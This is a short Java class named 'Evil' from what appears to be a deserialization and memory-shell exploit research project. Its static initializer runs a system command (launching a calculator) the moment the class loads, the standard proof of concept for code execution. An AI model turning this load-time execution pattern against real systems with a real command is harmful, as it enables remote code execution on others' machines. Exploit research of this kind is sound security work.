package xyz.eki.marshalexp.memshell;

public class Evil {
    static {
        try {
            Runtime.getRuntime().exec("mate-calc");
        } catch (Exception e) {}
    }
}
